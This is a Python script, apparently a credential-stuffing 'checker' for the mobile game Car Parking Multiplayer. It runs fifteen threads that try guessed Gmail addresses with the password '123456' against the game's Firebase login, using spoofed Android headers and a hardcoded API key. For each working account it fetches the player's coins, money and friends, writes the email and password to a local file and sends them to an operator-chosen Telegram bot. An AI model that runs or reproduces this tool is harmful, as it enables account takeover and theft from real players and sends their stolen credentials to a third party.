import requests, json, datetime, random, os, threading, traceback
try:
    from colorama import Fore
except:
    os.system('pip install colorama')
    from colorama import Fore
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say
try:
    from names import get_first_name
except:
    os.system('pip install names')
    from names import get_first_name

os.system('clear' if os.name == 'posix' else 'cls')

headers = {
    "Content-Type": "application/json",
    "X-Android-Package": "com.olzhas.carparking.multyplayer",
    "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
    "Accept-Language": "tr-TR, en-US",
    "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
    "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

a32 = '\x1b[38;5;180m' ; a14 = '\x1b[38;5;153m'
P = '\x1b[1;97m'
Ca = "\033[1;97m"
F = '\033[2;32m'
E = '\033[1;31m'

uk= [F, E, P]
co1= random.choice(uk)

def clear():
    print(F+f"""      
          \x1b[1;32m_  __      \x1b[1;31mCarParking Check          \x1b[1;32m_         
         \x1b[1;32m| |/ /   ___   _ __     ___  __   __ (_)  ____  
         | ' /   / _ \ | '_ \   / _ \ \ \ / / | | |_  /  
         | . \  |  __/ | | | | |  __/  \ V /  | |  / /   
         |_|\_\  \___| |_| |_|  \___|   \_/   |_| /___|  
             \x1b[1;36mTelegram : @dəyanət | @dynt
 \x1b[1;32m══════════════════════════════════════════════════════════════════""")

hits = 0
bad = 0

clear()
ID = input(f'\n{a32} İD Gir : ')
token = input(f'\n{a14} Bot Tokeni Gir : ')

os.system('clear' if os.name == 'posix' else 'cls')

def decode_nested_json(d):
    for key, value in d.items():
        if isinstance(value, str):
            try:
                nested_value = json.loads(value)
                d[key] = decode_nested_json(nested_value)
            except json.JSONDecodeError:
                continue
        elif isinstance(value, dict):
            d[key] = decode_nested_json(value)
    return d

counter = 1
counter_lock = threading.Lock()

def login(email, password):
    global hits, bad
    try:
        data = {
            "email": email,
            "password": password,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_ANDROID"
        }
        res = requests.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
            json=data, headers=headers).json()

        if "idToken" in res:
            basarili_path = "/storage/emulated/0/Download/basarili.txt"
            with open(basarili_path, "a") as f:
                f.write(f"{email}:{password}\n")

            tkn = res["idToken"]
            data2 = {"idToken": tkn}
            res2 = requests.post(
                "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
                json=data2, headers=headers).json()
            deta = res2['users'][0]['createdAt']

            data3 = {"data": "2893216D41959108CB8FA08951CB319B7AD80D02"}
            he = {
                "authorization": f"Bearer {tkn}",
                "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.12.13"
            }
            info = requests.post(
                "https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2",
                json=data3, headers=he).text

            data_account = json.loads(info)
            if 'result' in data_account:
                data_account['result'] = decode_nested_json(json.loads(data_account['result']))

            result_account = data_account["result"]
            try:
                Player_name = result_account['Name']
            except:
                Player_name = 'None'
            try:
                Friends_count = len(result_account['FriendsID'])
            except:
                Friends_count = 'None'
            try:
                Coins = result_account['coin']
            except:
                Coins = 'None'
            try:
                Money = result_account['money']
            except:
                Money = 'None'
            Date_Account = str(datetime.datetime.fromtimestamp(int(deta) / 1000)).split(' ')[0].replace('-', '/')
            msg_text = f'''*~ Car Parking 🚘*\n*———————————*\n*Email : *`{email}`\n*Şifre : *`{password}`\n*———————————*\n*İsim : {Player_name} 👤*\n*Coins : {Coins} 🪙*\n*Para : {Money} 💰*\n*Arkadaşlar : {Friends_count} 👥*\n*Tarih : {Date_Account}⌛️*\n*Telegram : @suka | @suka\n*———————————*\n'''

            # Telegram mesajını dosyaya kaydet
            telegram_log_path = "/storage/emulated/0/Download/telegram_mesajlari.txt"
            with open(telegram_log_path, "a", encoding="utf-8") as f:
                f.write(msg_text + "\n\n")

            try:
                url = f'https://api.telegram.org/bot{token}/sendMessage'
                payload = {'chat_id': str(ID), 'text': msg_text, 'parse_mode': 'markdown'}
                requests.post(url, params=payload)
            except Exception as e:
                print(f"Hata (Telegram gönderimi): {e}")

            hits += 1
            os.system('cls' if os.name == "nt" else "clear")
            print(f'{co1}             < ¦ {F}Doğru : {Ca}{hits} ~ {E}Yanlış : {Ca}{bad} ¦ >{P}   ')
        else:
            bad += 1
            os.system('cls' if os.name == "nt" else "clear")
            print(f'{co1}             < ¦ {F}Doğru : {Ca}{hits} ~ {E}Yanlış : {Ca}{bad} ¦ >{P}   ')
    except Exception as ex:
        print("Hata oluştu:\n", traceback.format_exc())
        print("Finished")
        # hata olsa da devam eder (return yok)

def RunChk():
    global counter
    while True:
        with counter_lock:
            num_str = f"{counter:02d}"
            counter += 1
        name = 'live'
        password = "123456"

        email1 = f"{num_str}{name}@gmail.com"    # başında sayı
        email2 = f"{name}{num_str}@gmail.com"    # sonunda sayı

        login(email1, password)
        login(email2, password)

threads = []
thread_count = 15  # Thread sayısı 15 olarak ayarlandı

for _ in range(thread_count):
    t = threading.Thread(target=RunChk)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
